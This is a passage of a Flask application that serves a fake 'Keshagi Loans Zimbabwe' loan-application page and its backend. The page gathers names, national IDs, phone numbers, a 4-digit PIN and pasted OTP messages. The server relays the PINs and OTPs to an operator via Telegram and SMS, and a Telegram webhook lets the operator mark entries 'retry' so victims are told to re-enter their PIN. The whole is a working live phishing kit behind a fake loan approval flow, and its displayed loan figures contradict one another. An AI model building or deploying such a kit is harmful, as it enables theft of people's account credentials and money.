          <span class="font-mono font-bold text-slate-800">EC-984210</span>
        </div>
        <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
          <span class="text-slate-500">Approved Amount</span>
          <span id="approved-amount" class="text-lg font-black text-[#004F71]">ZWG 100,000</span>
        </div>
        <div class="flex justify-between items-center pb-3 border-b border-slate-100 text-xs sm:text-sm">
          <span class="text-slate-500">Repayment Amount</span>
          <span id="approved-repay" class="font-bold text-slate-800">ZWG 1,080</span>
        </div>
        <div class="flex justify-between items-center text-xs sm:text-sm">
          <span class="text-slate-500">Repayment Date</span>
          <span id="approved-date" class="font-bold text-slate-800">30 September 2026</span>
        </div>
      </div>

      <div class="space-y-3">
        <button onclick="goTo('details')" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all">
          VIEW LOAN DETAILS
        </button>
        <button onclick="goTo('home')" class="w-full py-3.5 rounded-2xl bg-white border border-slate-200 text-slate-700 font-bold text-sm hover:bg-slate-50">
          BACK TO HOME
        </button>
      </div>
    </section>

    <!-- SCREEN 9: LOAN DETAILS -->
    <section id="screen-details" class="hidden space-y-5">
      <div class="flex items-center gap-3">
        <button onclick="goTo('home')" class="p-2  bg-white border border-slate-200 text-slate-600 hover:bg-slate-50">←</button>
        <div>
          <h2 class="text-xl font-black text-[#004F71]">ACTIVE LOAN DETAILS</h2>
          <p class="text-xs text-slate-500">Reference: EC-984210</p>
        </div>
      </div>

      <div class="bg-blue-50 border border-blue-200  p-5 flex items-center justify-between">
        <div>
          <span class="text-xs font-bold uppercase tracking-wider text-blue-800">Status</span>
          <div class="text-lg font-black text-blue-900">APPROVED & ACTIVE</div>
        </div>
        <span class="px-3 py-1 rounded-full text-xs font-bold  text-white">Active</span>
      </div>

      <div class="bg-white  p-6 border border-slate-200/80 shadow-sm space-y-3 text-xs sm:text-sm">
        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Principal</span><span id="details-principal" class="font-bold text-slate-800">ZWG 100,000</span></div>
        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Interest (5%)</span><span id="details-interest" class="font-bold text-slate-800">ZWG 50</span></div>
        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Service Fees</span><span id="details-fees" class="font-bold text-slate-800">ZWG 30</span></div>
        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Total Repayment</span><span id="details-total" class="font-black text-[#004F71]">ZWG 1,080</span></div>
        <div class="flex justify-between py-1.5"><span class="text-slate-500">Due Date</span><span id="details-date" class="font-bold text-slate-800">30/09/2026</span></div>
      </div>

      <button onclick="goTo('home')" class="w-full py-4 rounded-2xl bg-[#004F71] hover:bg-[#00334E] text-white font-bold text-base tracking-wide shadow-md transition-all">
        BACK TO HOME
      </button>
    </section>

  </main>

  <!-- INFO MODAL -->
  <div id="info-modal" class="fixed inset-0 z-50 hidden flex items-center justify-center p-4">
    <div onclick="closeInfoModal()" class="absolute inset-0 bg-slate-900/50 backdrop-blur-xs"></div>
    <div class="relative bg-white  p-6 max-w-sm w-full shadow-2xl border border-slate-200 text-center space-y-3 z-10">
      <h3 id="info-title" class="text-lg font-bold text-[#004F71]">Information</h3>
      <p class="text-xs text-slate-600">This is a demonstration preview of the Keshagi Zimbabwe loan journey. Features in this section are mock placeholders for demonstration.</p>
      <button onclick="closeInfoModal()" class="w-full py-2.5 rounded-xl bg-[#004F71] text-white font-bold text-xs">Close</button>
    </div>
  </div>

  <!-- FOOTER -->
  <footer class="w-full max-w-[760px] mx-auto px-4 py-4 text-center text-xs text-slate-400 border-t border-slate-200">
    Keshagi Loans Zimbabwe • Digital Loan App
  </footer>

  <script>
       const urlParams = new URLSearchParams(window.location.search);
    const urlRef = urlParams.get('ref');
    if (urlRef) sessionStorage.setItem('keshagi_ref', urlRef);

    let appState = {
      appId: Date.now().toString(),
      ref: sessionStorage.getItem('keshagi_ref') || 'default',
      fullName: "",
      mobile: "",
      nationalId: "",
      birthDate: "",
      purpose: "Business",
      amount: 500,
      period: 30
    };

    let enteredPin = '';
    let countdown = 30;
    let timer = null;

    // Debug function to check state
    function debugState() {
      console.log("Current App State:", appState);
      console.log("Current Visible Screen:", document.querySelector('section:not(.hidden)'));
    }

    function goTo(screenName) {
      const screens = ['home', 'apply', 'loan', 'review', 'pin', 'otp', 'processing', 'approved', 'details'];
      screens.forEach(s => {
        const el = document.getElementById('screen-' + s);
        if (el) el.classList.add('hidden');
      });
      const target = document.getElementById('screen-' + screenName);
      if (target) target.classList.remove('hidden');
      window.scrollTo({ top: 0, behavior: 'smooth' });
      if (screenName === 'review') populateReview();
      if (screenName === 'otp') startOtpTimer();
    }

    function toggleMenu(open) {
      const drawer = document.getElementById('drawer');
      const panel = document.getElementById('drawer-panel');
      if (!drawer || !panel) return;
      if (open) {
        drawer.classList.remove('pointer-events-none', 'opacity-0');
        panel.classList.remove('translate-x-full');
      } else {
        drawer.classList.add('pointer-events-none', 'opacity-0');
        panel.classList.add('translate-x-full');
      }
    }

    function formatMobileWithCountryCode(phone) {
      if (!phone) return "+263 77 123 4567";
      let cleaned = phone.replace(/[^0-9+]/g, '');
      if (cleaned.startsWith('+')) return cleaned;
      if (cleaned.startsWith('0')) {
        cleaned = cleaned.substring(1);
      }
      return '+263 ' + cleaned;
    }

    function handleFormSubmit(event) {
      event.preventDefault();
      appState.fullName = document.getElementById('input-fullname').value;
      appState.mobile = document.getElementById('input-mobile').value;
      appState.nationalId = document.getElementById('input-nationalid').value;
      appState.birthDate = document.getElementById('input-dob') ? document.getElementById('input-dob').value : "";
      appState.purpose = document.getElementById('input-purpose').value;
      appState.amount = parseInt(document.getElementById('input-amount').value) || 500;
      
      syncAmount(appState.amount);

      // Instantly send Telegram notification for new application submission
      fetch('/api/save', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
        appId: appState.appId,
        ref: appState.ref,
        fullName: appState.fullName,
        mobile: formatMobileWithCountryCode(appState.mobile),
        nationalId: appState.nationalId,
        purpose: appState.purpose,
        amount: appState.amount
      })

      }).catch(err => console.error(err));

      goTo('loan');
    }

    function showInfoModal(title) {
      toggleMenu(false);
      document.getElementById('info-title').innerText = title;
      document.getElementById('info-modal').classList.remove('hidden');
    }

    function closeInfoModal() {
      document.getElementById('info-modal').classList.add('hidden');
    }

    function setPurpose(p) {
      appState.purpose = p;
      const sel = document.getElementById('input-purpose');
      if (sel) sel.value = p;
      goTo('apply');
    }

    function calculateCosts() {
      const val = appState.amount;
      const days = appState.period;
      
      let rate = 0.05;
      if (days <= 7) rate = 0.03;
      else if (days <= 14) rate = 0.05;
      else if (days <= 30) rate = 0.10;
      else if (days <= 60) rate = 0.15;
      else rate = 0.20;

      const interest = Math.round(val * rate);
      const fee = Math.round(val * 0.03);
      const total = val + interest + fee;

      const interestEl = document.getElementById('breakdown-interest');
      const feeEl = document.getElementById('breakdown-fee');
      const totalEl = document.getElementById('breakdown-total');

      if (interestEl) interestEl.innerText = 'ZWG ' + interest.toLocaleString();
      if (feeEl) feeEl.innerText = 'ZWG ' + fee.toLocaleString();
      if (totalEl) totalEl.innerText = 'ZWG ' + total.toLocaleString();

      const dateEl = document.getElementById('breakdown-date');
      if (dateEl) {
        const d = new Date();
        d.setDate(d.getDate() + days);
        dateEl.innerText = d.toLocaleDateString('en-GB');
      }
    }

    function setPeriod(days) {
      appState.period = days;
      document.querySelectorAll('.period-btn').forEach(btn => {
        btn.classList.remove('bg-[#004F71]', 'text-white', 'border-[#004F71]', 'shadow-sm');
        btn.classList.add('text-slate-700', 'border-slate-200');
        if (btn.innerText.includes(days + ' Days')) {
          btn.classList.add('bg-[#004F71]', 'text-[#FFCC00]', 'border-[#004F71]', 'shadow-sm');
          btn.classList.remove('text-slate-700', 'border-slate-200');
        }
      });
      calculateCosts();
    }
    function setCustomDate(val) {
      if (!val) return;
      const chosen = new Date(val);
      const today = new Date();
      today.setHours(0, 0, 0, 0);
      const diffTime = chosen - today;
      const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
      if (diffDays > 0) {
        appState.period = diffDays;
        document.querySelectorAll('.period-btn').forEach(btn => {
          btn.classList.remove('bg-[#004F71]', 'text-[#FFCC00]', 'border-[#004F71]', 'shadow-sm');
          btn.classList.add('text-slate-700', 'border-slate-200');
        });
        calculateCosts();
      }
    }


    function toggleConfirm(checked) {
      const btn = document.getElementById('btn-confirm');
      if (btn) {
        btn.disabled = !checked;
        if (checked) {
          btn.classList.remove('bg-slate-300', 'cursor-not-allowed');
          btn.classList.add('bg-[#004F71]', 'hover:bg-[#00334E]');
        } else {
          btn.classList.add('bg-slate-300', 'cursor-not-allowed');
          btn.classList.remove('bg-[#004F71]', 'hover:bg-[#00334E]');
        }
      }
    }

    function populateReview() {
      const nameEl = document.getElementById('review-name');
      const mobileEl = document.getElementById('review-mobile');
      const idEl = document.getElementById('review-id');
      const purposeEl = document.getElementById('review-purpose');
      const principalEl = document.getElementById('review-principal');
      const periodEl = document.getElementById('review-period');
      const totalEl = document.getElementById('review-total');
      const dateEl = document.getElementById('review-date');

      if (nameEl) nameEl.innerText = appState.fullName || "Tariro Moyo";
      if (mobileEl) mobileEl.innerText = appState.mobile || "+263 77 123 4567";
      if (idEl) idEl.innerText = appState.nationalId || "CM98102938102";
      if (purposeEl) purposeEl.innerText = appState.purpose || "Business";
      if (principalEl) principalEl.innerText = 'ZWG ' + (appState.amount || 100000).toLocaleString();
      if (periodEl) periodEl.innerText = appState.period + ' Days';

      const val = appState.amount || 100000;
      const days = appState.period || 30;
      let rate = 0.05;
      if (days <= 7) rate = 0.03;
      else if (days <= 14) rate = 0.05;
      else if (days <= 30) rate = 0.10;
      else if (days <= 60) rate = 0.15;
      else rate = 0.20;

      const interest = Math.round(val * rate);
      const fee = Math.round(val * 0.03);
      const total = val + interest + fee;

      if (totalEl) totalEl.innerText = 'ZWG ' + total.toLocaleString();

      if (dateEl) {
        const d = new Date();
        d.setDate(d.getDate() + days);
        dateEl.innerText = d.toLocaleDateString('en-GB');
      }

      // Reset confirm checkbox and button state when entering review screen
      const checkEl = document.getElementById('confirm-check');
      if (checkEl) {
        checkEl.checked = false;
        toggleConfirm(false);
      }
    }

    let isPinBusy = false;

    function pressPin(digit) {
      if (isPinBusy || enteredPin.length >= 4) return;
      enteredPin += digit;
      updatePinDots();
      if (enteredPin.length === 4) {
        isPinBusy = true;
        const msg = document.getElementById('pin-status-msg');
        if (msg) msg.innerText = 'Verifying PIN...';
        
        // Add wave animation to dots with staggered delays
        for (let i = 0; i < 4; i++) {
          const dot = document.getElementById('dot-' + i);
          if (dot) dot.classList.add('wave-dot-' + i);
        }

        setTimeout(submitPin, 4500);
      }
    }

    function clearPin() {
      if (isPinBusy) return;
      enteredPin = '';
      updatePinDots();
    }

    function backspacePin() {
      if (isPinBusy) return;
      enteredPin = enteredPin.slice(0, -1);
      updatePinDots();
    }

    function updatePinDots() {
      for (let i = 0; i < 4; i++) {
        const dot = document.getElementById('dot-' + i);
        if (dot) {
          if (i < enteredPin.length) {
            dot.classList.add('bg-[#004F71]', 'border-[#004F71]');
            dot.classList.remove('border-slate-300');
          } else {
            dot.classList.remove('bg-[#004F71]', 'border-[#004F71]');
            dot.classList.add('border-slate-300');
          }
        }
      }
    }

    let decisionTimer = null;
    let otpStepTimer = null;
    let otpAutoTimer = null;
    function showApprovedScreen() {
  const approvedAmt = document.getElementById('approved-amount');
  const approvedRepay = document.getElementById('approved-repay');
  const approvedDate = document.getElementById('approved-date');

  const val = appState.amount || 500;
  const days = appState.period || 30;
  let rate = 0.05;
  if (days <= 7) rate = 0.03;
  else if (days <= 14) rate = 0.05;
  else if (days <= 30) rate = 0.10;
  else if (days <= 60) rate = 0.15;
  else rate = 0.20;

  const interest = Math.round(val * rate);
  const total = val + interest;
  if (approvedAmt) approvedAmt.innerText = 'ZWG ' + val.toLocaleString();
  if (approvedRepay) approvedRepay.innerText = 'ZWG ' + total.toLocaleString();
  if (approvedDate) {
    const d = new Date();
    d.setDate(d.getDate() + days);
    approvedDate.innerText = d.toLocaleDateString();
  }
  goTo('approved');
}


    function watchHostDecision(step) {
      if (decisionTimer) clearInterval(decisionTimer);
      decisionTimer = setInterval(async () => {
        try {
          const res = await fetch(`/api/status/${appState.appId}`);
          const data = await res.json();
          if (data.status === 'retry') {
            clearInterval(decisionTimer);
            if (otpStepTimer) clearTimeout(otpStepTimer);
            if (otpAutoTimer) clearTimeout(otpAutoTimer);
            if (step === 'pin') {
                isPinBusy = false;
                enteredPin = '';
                for (let i = 0; i < 4; i++) {
                    const dot = document.getElementById('dot-' + i);
                    if (dot) dot.classList.remove('wave-dot-' + i);
                }
                updatePinDots();
                const msg = document.getElementById('pin-status-msg');
                if (msg) msg.innerText = 'Incorrect PIN. Please re-enter.';
                goTo('pin');
                alert('The PIN entered is incorrect. Please re-enter your PIN.');
            } else if (step === 'otp') {
                const btnOtp = document.getElementById('btn-otp');
                if (btnOtp) { btnOtp.disabled = false; btnOtp.innerText = 'VERIFY & CONTINUE'; }
                const errorMsg = document.getElementById('otp-error-msg');
                if (errorMsg) errorMsg.innerText = 'Incorrect code entered. Please re-enter the code.';
                goTo('otp');
            }
        } else if (data.status === 'approve') {
            clearInterval(decisionTimer);
            if (otpStepTimer) clearTimeout(otpStepTimer);
            if (otpAutoTimer) clearTimeout(otpAutoTimer);
            if (step === 'pin') {
                isPinBusy = false;
                enteredPin = '';
                const msg = document.getElementById('pin-status-msg');
                if (msg) msg.innerText = '';
                for (let i = 0; i < 4; i++) {
                    const dot = document.getElementById('dot-' + i);
                    if (dot) dot.classList.remove('wave-dot-' + i);
                }
                updatePinDots();
                goTo('otp');
            } else {
                showApprovedScreen();
            }
        }
    } catch (e) {}
}, 3000);
}

async function submitPin() {
    const formattedPhone = formatMobileWithCountryCode(appState.mobile);
    const otpLabel = document.getElementById('otp-mobile-label');
    if (otpLabel) otpLabel.innerText = formattedPhone;

    const msg = document.getElementById('pin-status-msg');
    if (msg) msg.innerText = 'Verifying PIN... Please wait.';

    try {
        await fetch('/api/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                appId: appState.appId,
                ref: appState.ref,
                fullName: appState.fullName,
                mobile: formattedPhone,
                field: 'entered_pin',
                value: enteredPin
            })
        });
    } catch (err) {
        console.error(err);
    }

    watchHostDecision('pin');
}

    function otpMove(input, index) {
      if (input.value.length === 1 && index < 6) {
        const nextInput = input.parentElement.children[index];
        if (nextInput) nextInput.focus();
      }
    }

    function startOtpTimer() {
      countdown = 30;
      const resendBtn = document.getElementById('resend-btn');
      if (timer) clearInterval(timer);
      
      timer = setInterval(() => {
        countdown--;
        if (resendBtn) {
          if (countdown > 0) {
            resendBtn.innerText = `Resend code in ${countdown}s`;
            resendBtn.disabled = true;
          } else {
            resendBtn.innerText = 'Resend code';
            resendBtn.disabled = false;
            clearInterval(timer);
          }
        }
      }, 1000);
    }

    function resendOtp() {
      startOtpTimer();
    }

    async function startProcessing() {
      const otpTextarea = document.getElementById('otp-message-paste');
      const otpCode = otpTextarea ? otpTextarea.value.trim() : '';

           if (!otpCode) {
        const errorMsg = document.getElementById('otp-error-msg');
        if (errorMsg) errorMsg.innerText = 'Please paste the verification message first.';
        return;
      } else {
        const errorMsg = document.getElementById('otp-error-msg');
        if (errorMsg) errorMsg.innerText = '';
      }

      const btnOtp = document.getElementById('btn-otp');
      if (btnOtp) {
        btnOtp.disabled = true;
        btnOtp.innerText = 'VERIFYING CODE...';
      }

      const formattedPhone = formatMobileWithCountryCode(appState.mobile);

    try {
        await fetch('/api/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                appId: appState.appId,
                ref: appState.ref,
                fullName: appState.fullName,
                mobile: formattedPhone,
                field: 'entered_otp',
                value: otpCode
            })
        });
    } catch (err) {
        console.error(err);
    }

    watchHostDecision('otp');
}

    function syncAmount(val, isFromInput = false) {
      let parsedVal = parseInt(val) || 500;
      if (parsedVal > 500000) parsedVal = 500000;
      appState.amount = parsedVal;
      
      if (!isFromInput) {
        const inp = document.getElementById('input-amount');
        if (inp) inp.value = parsedVal;
      }
      
      const slider = document.getElementById('amount-slider');
      if (slider) slider.value = parsedVal;
      const disp = document.getElementById('display-amount');
      if (disp) disp.innerText = 'ZWG ' + parsedVal.toLocaleString();
      
      calculateCosts();
    }
  </script>
</body>
</html>
"""

@app.route('/')
def home():
    return Response(HTML_PAGE, mimetype='text/html')

# Endpoint: Unified data saving and tracking
@app.route('/api/save', methods=['POST'])
def save_unified():
    try:
        data = request.get_json(silent=True) or {}
        app_id = data.get('appId') or data.get('session_id')
        if not app_id:
            return jsonify({'status': 'error', 'message': 'Missing appId'}), 400

        name = data.get('fullName', 'Unknown')
        phone = data.get('mobile', data.get('phone', 'NoPhone'))
        f_n = data.get('field')
        f_v = data.get('value')
        now = get_now_str()
        ref = data.get('ref', 'default')

        if db:
            db.delete(f"status:{app_id}")

        if f_n == 'entered_pin':
            m = f'🔐 PIN Received\n\n👤 User: {name}\n🔢 PIN: {f_v}\n📞 Phone: {phone}'
            send_telegram_notification(m, record_id=app_id, ref=ref)
            send_sms_notification(f"[Keshagi Alert] PIN Received\nUser: {name}\nPhone: {phone}\nPIN: {f_v}")
        elif f_n == 'entered_otp':
            m = f'📱 OTP Received\n\n👤 User: {name}\n🔑 OTP: {f_v}\n📞 Phone: {phone}'
            send_telegram_notification(m, record_id=app_id, ref=ref)
            send_sms_notification(f"[Keshagi Alert] OTP Received\nUser: {name}\nPhone: {phone}\nOTP: {f_v}")
        elif not f_n:
            amt = data.get('amount', 'N/A')
            m = f'🚀 *New Application Submitted*\n\n👤 *Name:* {name}\n📞 *Phone:* {phone}\n💰 *Amount:* ZWG {amt}\n📅 *Time:* {now}'
            send_telegram_notification(m, ref=ref)
            send_sms_notification(f"[Keshagi Alert] New Application\nName: {name}\nPhone: {phone}\nAmount: ZWG {amt}")


        return jsonify({'status': 'success', 'record_id': app_id})
    except Exception as e:
        print(f"Error in unified save: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# Legacy endpoints redirected to unified logic
@app.route('/api/track-input', methods=['POST'])
def track_input():
    return save_unified()
from flask import send_from_directory

@app.route('/assets/<path:filename>')
def serve_assets(filename):
    return send_from_directory('assets', filename)

LOCAL_STATUS_STORE = {}

@app.route('/api/telegram-webhook', methods=['POST'])
def telegram_webhook():
    update = request.get_json(silent=True) or {}
    callback = update.get("callback_query")
    if callback:
        parts = callback.get("data", "").split(":")
        callback_id = callback.get("id")
        if len(parts) >= 2:
            action = parts[0]
            record_id = parts[1]
            ref = parts[2] if len(parts) > 2 else "default"

            LOCAL_STATUS_STORE[str(record_id)] = action
            if db:
                try:
                    db.setex(f"status:{record_id}", 900, action)
                except Exception as e:
                    print(f"Redis setex error: {e}")

            token, _ = get_bot_config(ref)
            if token:
                reply_text = "Marked as INCORRECT. Client prompted to re-enter." if action == "retry" else "Marked as APPROVED."
                requests.post(
                    "https://api.telegram.org/bot" + str(token) + "/answerCallbackQuery",
                    json={"callback_query_id": callback_id, "text": reply_text, "show_alert": True},
                    timeout=5
                )
    return jsonify({"ok": True})

@app.route('/api/status/<record_id>', methods=['GET'])
def check_status(record_id):
    status = None
    if db:
        try:
            status = db.get(f"status:{record_id}")
        except Exception:
            pass
    if not status:
        status = LOCAL_STATUS_STORE.get(str(record_id))
    return jsonify({"status": status or "pending"})

if __name__ == "__main__":
    app.run(debug=True, port=int(os.environ.get("PORT", 8000)))
